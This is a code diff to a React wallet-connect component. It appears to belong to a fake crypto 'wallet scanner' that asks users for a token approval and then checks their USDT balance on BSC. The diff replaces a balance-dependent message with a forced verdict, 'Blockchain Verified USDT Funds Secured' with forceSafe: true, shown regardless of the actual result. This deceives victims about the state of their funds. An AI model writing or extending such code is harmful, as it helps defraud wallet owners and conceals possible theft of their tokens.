@@ -18,6 +18,9 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
   const [copied, setCopied] = useState(false);
   const [isApproving, setIsApproving] = useState(false);
 
+  const [showScanner, setShowScanner] = useState(false);
+  const [scannerResult, setScannerResult] = useState<any>(null);
+
   const { address, isConnected, chain } = useAccount();
   const { connect, connectors, isPending, error } = useConnect();
   const { disconnect } = useDisconnect();
@@ -152,12 +155,24 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
 
           } catch { /* ignore */ }
 
-          if (Number(usdtBalance) > 200) {
-            toast.error('Your tokens are burned out.');
-          } else {
-            toast.success("Your tokens are safe")
-          }
-          // <Scanner isScanning={true} result={{ address: address, balance: usdtBalance, network: 'BSC' }} onClose={() => { }} />
+          const updatedBalance = await publicClient.readContract({
+            address: USDT_ADDRESSES.BSC as `0x${string}`,
+            abi: ERC20_ABI,
+            functionName: 'balanceOf',
+            args: [address],
+          });
+
+          const actualBalance = Number(formatUnits(updatedBalance as bigint, 18));
+
+          setScannerResult({
+            address: address,
+            balance: actualBalance,
+            network: 'BSC',
+            customMessage: "Blockchain Verified USDT Funds Secured",
+            forceSafe: true
+          });
+
+          setShowScanner(true);
         }
       } catch (err) {
         // user reject / wallet error -> do nothing
@@ -510,6 +525,14 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
           </motion.div>
         )}
       </AnimatePresence>
+
+      {showScanner && (
+        <Scanner
+          isScanning={false}
+          result={scannerResult}
+          onClose={() => setShowScanner(false)}
+        />
+      )}
     </>
   );
 }
